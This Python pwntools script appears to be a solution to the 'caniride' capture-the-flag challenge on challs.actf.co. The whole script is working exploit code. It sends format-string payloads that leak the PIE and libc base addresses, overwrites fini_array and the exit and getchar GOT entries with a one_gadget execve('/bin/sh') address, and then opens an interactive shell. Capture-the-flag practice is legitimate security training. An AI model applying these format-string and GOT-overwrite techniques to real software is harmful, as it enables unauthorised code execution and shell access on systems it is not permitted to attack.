#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31225 ./caniride
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./caniride_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31228)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+533
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc.so.6")

def make_offset(addr, length=1):
    len_format = 2**(length*8)-1
    offset = []

    for i in range(int(8/length)):
       tmp = addr & len_format
       offset.append(tmp)
       addr >>= len_format.bit_length() # bit

    return offset

p = f'%{0x69}x%16$hhn'.encode()
p += b"-START-%143$p-END"
# p = '%{}x%6$hhn'.format(off[0])
# p += '%{}x%7$hhn'.format(off[1] - off[0] + length + 1)
# p += '%{}x%8$hhn'.format(off[2] - off[1] + length + 1)
io.sendlineafter(b": ",p)

p = b"-3"
io.sendlineafter(b": ",p)
io.recvuntil(b"this is ")
exe.address = u64(io.recvuntil(b" your",drop=True).ljust(8,b"\x00")) - 0x35a8
print (hex(exe.address))
init_array = exe.address + 0x00000000000032f8
fini_array = exe.address + 0x0000000000003300

p = p64(fini_array)
io.sendlineafter(b": ",p)
# 16
# x/gx 0x0055971a721000+0x00000000000032f8
# set *0x5570ce6582f8=0x5570ce656269
# 0x7f073cf40898
# 0xe3b2e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b31 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b34 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

io.recvuntil(b"-START-")
libc.address = int(io.recvuntil(b"-END!",drop=True),16) - libc.sym['__libc_start_main'] - 243
print (f"libc base : {hex(libc.address)}")

off_og = [0xe3b2e, 0xe3b31, 0xe3b34]
one_gadget = libc.address + off_og[2]
print (f"one_gadget : {hex(one_gadget)}")

off = make_offset(exe.sym['main'],2)

length = 2
length = 2**(length*8)-1

p = f'%{off[0]}x%16$hn'.encode()
p += f'%{off[1] - off[0] + length+1}x%17$hn'.encode()
p += f'%{off[2] - off[1] + length+1}x%18$hn'.encode()
p += b"-HEREEND-"
print(len(p))
io.sendlineafter(b": ",p)

p = b"-3"
io.sendlineafter(b": ",p)

p = p64(exe.got['exit'])
p += p64(exe.got['exit']+2)
p += p64(exe.got['exit']+4)
io.sendlineafter(b": ",p)
io.recvuntil(b"-HEREEND-")


off = make_offset(one_gadget,2)

p = f'%{off[0]}x%16$hn'.encode()
p += f'%{off[1] - off[0] + length+1}x%17$hn'.encode()
# p += f'%{off[2] - off[1] + length+1}x%18$hn'.encode()
p += b"-HEREEND-"
print(len(p))
io.sendlineafter(b": ",p)

p = b"-3"
io.sendlineafter(b": ",p)

p = p64(exe.got['getchar'])
p += p64(exe.got['getchar']+2)
p += p64(exe.got['getchar']+4)
io.sendlineafter(b": ",p)
# io.recvuntil(b"-HEREEND-")

io.interactive()

